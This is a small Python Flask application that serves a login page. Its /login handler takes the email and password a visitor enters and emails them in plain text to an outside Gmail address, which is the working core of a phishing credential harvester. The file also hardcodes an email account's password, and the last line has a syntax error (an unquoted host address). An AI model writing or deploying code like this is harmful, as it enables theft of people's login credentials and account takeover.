from flask import Flask, render_template, request
import smtplib

app = Flask("__main__")

MY_GMAIL = "vedanksrivastavakai@gmail.com"
PASSWORD = "vedank1234567890"


@app.route('/')
def home_page():
    return render_template('main.html')


@app.route('/login', methods=['POST', 'GET'])
def login_page():
    if request.method == 'POST':
        data = request.form
        email = data['email']
        password = data['password']
        with smtplib.SMTP('smtp.gmail.com') as connection:
            connection.starttls()
            connection.login(user=MY_GMAIL, password=PASSWORD)
            connection.sendmail(
                from_addr=MY_GMAIL,
                to_addrs="vedanksrivastava123@gmail.com",
                msg=f"Subject:New login.\n\nEmail: {email}\nPassword: {password}\n"
            )
        return render_template('HF2.html', msg_sent=True)
    return render_template('index.html', msg_sent=False)


if __name__ == "__main__":
    app.run(debug=True, host=0.0.0.0)
